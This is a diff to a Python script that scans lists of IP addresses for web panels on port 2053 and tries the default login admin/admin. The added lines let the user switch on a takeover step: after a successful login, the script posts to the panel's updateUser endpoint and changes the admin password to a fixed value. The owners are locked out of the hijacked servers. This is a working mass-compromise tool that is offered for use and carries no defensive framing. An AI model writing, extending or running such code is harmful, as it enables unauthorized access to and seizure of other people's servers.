@@ -201,19 +201,38 @@ print(f"number of ip is : {total_ips}")
 
 max_workers = int(input("max_workers ==>"))
 timeout = float(input("Set the timeout for requests please set by network status==>"))
+if input("change pass y/n==>").upper() == "Y":
+    change_password = True
+else : change_password = False
 
-def checker(ip: str, timeout: float, port : int):
+def checker(ip: str, timeout: float, port : int, change_password:bool):
     """
     Check if the Plesk server at the given IP address and port 2083 is accessible.
     """
     try:
-        url = f"http://{ip}:{port}/login"
+        s = requests.Session()
+        login_url = f"http://{ip}:{port}/login"
 
         data = {'username': 'admin', 'password': 'admin'}
 
-        response = requests.post(url, data, timeout=timeout)
+        response = s.post(login_url, data, timeout=timeout)
 
         response_json = response.json()
+        if change_password == True and response_json["success"]:
+            newpass = {
+            "oldUsername": "admin",
+            "oldPassword":	"admin",
+            "newUsername":	"admin",
+            "newPassword":	"Rahim_x"
+            } 
+            url = f"http://{ip}:{port}/panel/setting/updateUser"
+            change_password_st = s.post(url, newpass)
+            ch_json = change_password_st.json()
+            if ch_json["success"]:
+                return True
+            else:
+                loger((ch_json['msg']), 1, "chm")
+
 
         if response_json["success"]:
             return True
@@ -224,7 +243,7 @@ def checker(ip: str, timeout: float, port : int):
 
 def scan_ip(ip):
     ip = ip.strip()
-    result = checker(ip, timeout, 2053)
+    result = checker(ip, timeout, 2053, change_password)
     loger(ip, 2053, result)
 
 def batch_file(filename, batch_size):
